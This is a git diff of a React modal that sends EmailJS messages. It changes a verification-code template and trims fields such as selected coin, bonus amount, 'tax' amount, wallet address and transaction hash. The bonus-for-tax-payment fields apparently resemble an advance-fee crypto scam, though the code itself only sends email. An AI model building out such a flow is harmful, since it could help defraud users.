@@ -166,19 +166,11 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
     try {
       await emailjs.send(
         "service_tsr17gh",
-        "template_5o9jymt", // reuse existing template — pass code via a field
+        "template_7qaifir", // reuse existing template — pass code via a field
         {
           to_email: email,
           user_name: fullName,
           verification_code: code,
-          // fill other template vars with placeholders so it doesn't break
-          selected_coin: selectedCoin,
-          bonus_amount: "",
-          bonus_usd: "",
-          tax_amount: "",
-          tax_usd: "",
-          wallet_address: walletAddress,
-          tx_hash: "",
         },
         "oXPWYhRUKU0tlucOg"
       );
@@ -212,7 +204,6 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
           tax_usd: `$${taxUsd.toLocaleString(undefined, { maximumFractionDigits: 2 })}`,
           wallet_address: walletAddress,
           tx_hash: txHash || "Screenshot uploaded",
-          verification_code: "",
         },
         "oXPWYhRUKU0tlucOg"
       )
